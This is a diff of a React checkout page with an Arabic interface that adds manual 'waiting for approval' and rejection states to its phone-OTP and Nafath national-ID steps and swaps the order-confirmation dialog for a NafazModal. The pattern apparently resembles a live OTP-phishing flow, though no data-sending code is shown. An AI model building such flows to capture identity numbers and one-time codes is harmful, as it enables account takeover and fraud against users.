+                      const val = e.target.value.replace(/\D/g, "");
+                      setPhoneOtp(val);
+                    }}
                     className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                   />
                 </div>
-                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
+                {verificationError && (
+                  <p className="text-sm text-destructive text-center mt-2">
+                    {verificationError}
+                  </p>
+                )}
               </div>
 
               <div className="text-center text-sm text-muted-foreground">
                 {canResendOtp ? (
-                  <button onClick={handleResendOtp} className="text-primary hover:underline font-medium">
+                  <button
+                    onClick={handleResendOtp}
+                    className="text-primary hover:underline font-medium"
+                  >
                     إعادة إرسال الرمز
                   </button>
                 ) : (
@@ -1222,26 +1735,48 @@ export default function CheckoutPage() {
                 )}
               </div>
 
-              <div className="flex gap-3">
-                <Button
-                  variant="outline"
-                  className="flex-1 bg-transparent"
-                  onClick={() => setStep("phone-verification")}
-                  disabled={isVerifying}
-                >
-                  رجوع
-                </Button>
-                <Button className="flex-1" onClick={handlePhoneOtpVerify} disabled={isVerifying}>
-                  {isVerifying ? (
-                    <>
-                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
-                      جاري التحقق...
-                    </>
-                  ) : (
-                    "تحقق"
-                  )}
-                </Button>
-              </div>
+              {rejectionError && (
+                <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
+                  <p className="text-destructive font-medium">
+                    {rejectionError}
+                  </p>
+                </div>
+              )}
+
+              {waitingForApproval ? (
+                <div className="text-center py-4">
+                  <Loader2 className="h-8 w-8 animate-spin mx-auto mb-3 text-primary" />
+                  <p className="text-lg font-medium">{approvalMessage}</p>
+                  <p className="text-sm text-muted-foreground mt-2">
+                    يرجى الانتظار حتى يتم التحقق
+                  </p>
+                </div>
+              ) : (
+                <div className="flex gap-3">
+                  <Button
+                    variant="outline"
+                    className="flex-1 bg-transparent"
+                    onClick={() => goToStep("phone-verification")}
+                    disabled={isVerifying}
+                  >
+                    رجوع
+                  </Button>
+                  <Button
+                    className="flex-1"
+                    onClick={handlePhoneOtpVerify}
+                    disabled={isVerifying}
+                  >
+                    {isVerifying ? (
+                      <>
+                        <Loader2 className="ml-2 h-4 w-4 animate-spin" />
+                        جاري التحقق...
+                      </>
+                    ) : (
+                      "تحقق"
+                    )}
+                  </Button>
+                </div>
+              )}
             </CardContent>
           </Card>
         )}
@@ -1252,27 +1787,37 @@ export default function CheckoutPage() {
               <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                 <Shield className="h-6 w-6 text-primary" />
               </div>
-              <CardTitle className="text-2xl text-center">التحقق عبر نفاذ</CardTitle>
-              <CardDescription className="text-center">أدخل رقم الهوية الوطنية</CardDescription>
+              <CardTitle className="text-2xl text-center">
+                التحقق عبر نفاذ
+              </CardTitle>
+              <CardDescription className="text-center">
+                أدخل رقم الهوية الوطنية
+              </CardDescription>
             </CardHeader>
             <CardContent className="space-y-6">
               <div>
-                <Label className="text-center block mb-4">رقم الهوية (10 أرقام)</Label>
+                <Label className="text-center block mb-4">
+                  رقم الهوية (10 أرقام)
+                </Label>
                 <div className="flex gap-2 justify-center" dir="ltr">
                   <Input
                     type="text"
                     inputMode="numeric"
                     maxLength={10}
-                    value={nafathId}
+                    value={nafadUsername}
                     onChange={(e) => {
-                      const value = e.target.value.replace(/\D/g, "")
-                      setNafathId(value)
+                      const value = e.target.value.replace(/\D/g, "");
+                      setnafadUsername(value);
                     }}
                     className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                     placeholder="1234567890"
                   />
                 </div>
-                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
+                {verificationError && (
+                  <p className="text-sm text-destructive text-center mt-2">
+                    {verificationError}
+                  </p>
+                )}
               </div>
 
               <div className="flex items-center gap-2 rounded-md bg-muted px-3 py-2 text-sm text-muted-foreground">
@@ -1280,94 +1825,58 @@ export default function CheckoutPage() {
                 التحقق عبر منصة نفاذ الوطنية الموحدة
               </div>
 
-              <div className="flex gap-3">
-                <Button
-                  variant="outline"
-                  className="flex-1 bg-transparent"
-                  onClick={() => setStep("phone-otp")}
-                  disabled={isVerifying}
-                >
-                  رجوع
-                </Button>
-                <Button className="flex-1" onClick={handleNafathVerify} disabled={isVerifying}>
-                  {isVerifying ? (
-                    <>
-                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
-                      جاري التحقق...
-                    </>
-                  ) : (
-                    "تحقق"
-                  )}
-                </Button>
-              </div>
+              {rejectionError && (
+                <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
+                  <p className="text-destructive font-medium">
+                    {rejectionError}
+                  </p>
+                </div>
+              )}
+
+              {waitingForApproval ? (
+                <div className="text-center py-4">
+                  <Loader2 className="h-8 w-8 animate-spin mx-auto mb-3 text-primary" />
+                  <p className="text-lg font-medium">{approvalMessage}</p>
+                  <p className="text-sm text-muted-foreground mt-2">
+                    يرجى الانتظار حتى يتم التحقق
+                  </p>
+                </div>
+              ) : (
+                <div className="flex gap-3">
+                  <Button
+                    variant="outline"
+                    className="flex-1 bg-transparent"
+                    onClick={() => goToStep("phone-otp")}
+                    disabled={isVerifying}
+                  >
+                    رجوع
+                  </Button>
+                  <Button
+                    className="flex-1"
+                    onClick={handleNafathVerify}
+                    disabled={isVerifying}
+                  >
+                    {isVerifying ? (
+                      <>
+                        <Loader2 className="ml-2 h-4 w-4 animate-spin" />
+                        جاري التحقق...
+                      </>
+                    ) : (
+                      "تحقق"
+                    )}
+                  </Button>
+                </div>
+              )}
             </CardContent>
           </Card>
         )}
 
         {step === "auth-dialog" && (
-          <Dialog open={true}>
-            <DialogContent className="max-w-md">
-              <DialogHeader>
-                <div className="mx-auto w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-4">
-                  <Check className="h-8 w-8 text-primary" />
-                </div>
-                <DialogTitle className="text-2xl text-center">تم التحقق بنجاح</DialogTitle>
-                <DialogDescription className="text-center">
-                  تم التحقق من جميع بياناتك بنجاح، هل تريد إتمام الطلب؟
-                </DialogDescription>
-              </DialogHeader>
-              <div className="space-y-4">
-                <div className="p-4 bg-muted rounded-lg space-y-2">
-                  <div className="flex justify-between">
-                    <span className="text-muted-foreground">الاسم</span>
-                    <span className="font-medium">{shippingInfo.fullName}</span>
-                  </div>
-                  <Separator />
-                  <div className="flex justify-between">
-                    <span className="text-muted-foreground">رقم الجوال</span>
-                    <span className="font-medium">{shippingInfo.phone}</span>
-                  </div>
-                  <Separator />
-                  <div className="flex justify-between">
-                    <span className="text-muted-foreground">مزود الخدمة</span>
-                    <Badge variant="secondary">{phoneProvider}</Badge>
-                  </div>
-                  <Separator />
-                  <div className="flex justify-between">
-                    <span className="text-muted-foreground">الإجمالي</span>
-                    <span className="font-bold text-lg">{finalTotal.toFixed(2)} ريال</span>
-                  </div>
-                </div>
-
-                {orderError && (
-                  <div className="p-4 bg-destructive/10 border border-destructive/20 rounded-lg">
-                    <p className="text-sm text-destructive text-center">{orderError}</p>
-                  </div>
-                )}
-
-                <div className="flex gap-3">
-                  <Button
-                    variant="outline"
-                    className="flex-1 bg-transparent"
-                    onClick={() => setStep("nafath")}
-                    disabled={isProcessingOrder}
-                  >
-                    رجوع
-                  </Button>
-                  <Button className="flex-1" onClick={handleFinalSubmit} disabled={isProcessingOrder}>
-                    {isProcessingOrder ? (
-                      <>
-                        <Loader2 className="ml-2 h-4 w-4 animate-spin" />
-                        جاري المعالجة...
-                      </>
-                    ) : (
-                      "إتمام الطلب"
-                    )}
-                  </Button>
-                </div>
-              </div>
-            </DialogContent>
-          </Dialog>
+          <NafazModal
+            isOpen={true}
+            onClose={() => setShowModal(false)}
+            phone={shippingInfo.phone}
+          />
         )}
 
         {/* Success Step */}
@@ -1377,8 +1886,12 @@ export default function CheckoutPage() {
               <div className="mx-auto w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                 <Check className="h-8 w-8 text-primary" />
               </div>
-              <CardTitle className="text-2xl text-primary">تم تأكيد الطلب بنجاح</CardTitle>
-              <CardDescription>شكرا لك، تم استلام طلبك وسيتم معالجته قريبا</CardDescription>
+              <CardTitle className="text-2xl text-primary">
+                تم تأكيد الطلب بنجاح
+              </CardTitle>
+              <CardDescription>
+                شكرا لك، تم استلام طلبك وسيتم معالجته قريبا
+              </CardDescription>
             </CardHeader>
             <CardContent className="space-y-4">
               <div className="p-4 bg-muted rounded-lg space-y-2">
@@ -1390,10 +1903,14 @@ export default function CheckoutPage() {
                 </div>
                 <div className="flex justify-between text-sm">
                   <span className="text-muted-foreground">المبلغ الإجمالي</span>
-                  <span className="font-bold">{finalTotal.toFixed(2)} ريال</span>
+                  <span className="font-bold">
+                    {finalTotal.toFixed(2)} ريال
+                  </span>
                 </div>
                 <div className="flex justify-between text-sm">
-                  <span className="text-muted-foreground">وقت التوصيل المتوقع</span>
+                  <span className="text-muted-foreground">
+                    وقت التوصيل المتوقع
+                  </span>
                   <span>3-5 أيام عمل</span>
                 </div>
               </div>
@@ -1406,7 +1923,10 @@ export default function CheckoutPage() {
                 <Button variant="outline" className="flex-1 bg-transparent">
                   تتبع الطلب
                 </Button>
-                <Button className="flex-1" onClick={() => window.location.reload()}>
+                <Button
+                  className="flex-1"
+                  onClick={() => window.location.reload()}
+                >
                   طلب جديد
                 </Button>
               </div>
@@ -1415,7 +1935,12 @@ export default function CheckoutPage() {
         )}
       </div>
 
-      {showMap && <MapAddressPicker onAddressSelect={handleMapAddressSelect} onClose={() => setShowMap(false)} />}
+      {showMap && (
+        <MapAddressPicker
+          onAddressSelect={handleMapAddressSelect}
+          onClose={() => setShowMap(false)}
+        />
+      )}
     </div>
-  )
+  );
 }
